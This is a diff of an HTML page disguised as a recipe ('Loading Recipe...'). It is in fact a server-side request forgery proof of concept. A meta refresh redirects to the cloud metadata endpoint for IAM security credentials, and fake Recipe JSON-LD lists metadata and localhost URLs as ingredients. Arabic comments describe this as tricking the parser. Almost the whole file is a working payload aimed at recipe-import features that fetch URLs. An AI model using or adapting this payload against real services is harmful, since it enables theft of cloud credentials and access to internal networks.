@@ -1,2 +1,22 @@
-<script>window.location.href = "http://169.254.169.254/latest/meta-data/hostname";</script>
-<meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- تحويل تلقائي عبر Meta Tag -->
+    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+</head>
+<body>
+    <!-- هيكل بيانات الوصفة لخداع الـ Parser -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org/",
+      "@type": "Recipe",
+      "name": "SSRF Proof of Concept",
+      "recipeIngredient": [
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://127.0.0.1:80"
+      ]
+    }
+    </script>
+    <h1>Loading Recipe...</h1>
+</body>
+</html>
